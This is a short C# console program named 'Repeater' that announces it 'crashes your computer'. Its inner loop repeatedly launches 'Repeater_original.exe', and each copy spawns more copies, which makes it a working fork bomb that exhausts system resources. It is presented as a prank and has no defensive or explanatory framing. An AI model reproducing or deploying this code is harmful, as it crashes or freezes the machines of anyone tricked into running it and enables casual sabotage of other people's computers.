using System;
using System.Diagnostics;

namespace Repeater
{
    public static class Repeat
    {
        public const string InternalVersion = "1.0.6";
        [STAThread]
        public static void Main(string[] args)
        {
            args = null;
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.BackgroundColor = ConsoleColor.DarkRed;
            string Message = "You just launched a program that crashes your computer :P";
            Console.Title = "Repeater" + " v" + InternalVersion;
            Console.WriteLine(Message);
            Counter.Main(null);
        }

        class Counter
        {
            public static int x;
            [STAThread]

            public static void Main(string[] args)
            {
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.BackgroundColor = ConsoleColor.DarkRed;
                while (x != int.MaxValue)
                {
                    x++;
                    Console.WriteLine(x);
                    Process.Start("Repeater_original.exe");
                }
                if (x == int.MaxValue)
                {
                    Console.WriteLine("Max limit reached! YAY!");
                    x = 0;
                    Console.WriteLine("Press any key to restart!");
                    Console.ReadKey(true);
                    Main(null);
                }
            }
        }
    }
}